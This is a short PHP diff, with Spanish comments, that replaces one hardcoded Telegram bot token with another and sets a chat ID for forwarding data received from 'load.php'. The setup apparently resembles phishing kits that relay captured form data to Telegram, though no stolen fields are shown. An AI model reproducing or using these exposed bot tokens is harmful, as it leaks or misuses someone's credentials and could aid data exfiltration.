@@ -1,6 +1,6 @@
 <?php
 // Configuración del bot de Telegram
-define('TELEGRAM_BOT_TOKEN', '7820322308:AAGfqVzbyVl_ceNP4ufou_Ga1vnAdfPw6N0');
+define('TELEGRAM_BOT_TOKEN', '7602610285:AAG9IcFA-RFU2ibYiufHOsVJ-XdDilQen8A');
 define('TELEGRAM_CHAT_ID', '-4900751978');
 
 // Recupera los datos enviados desde load.php
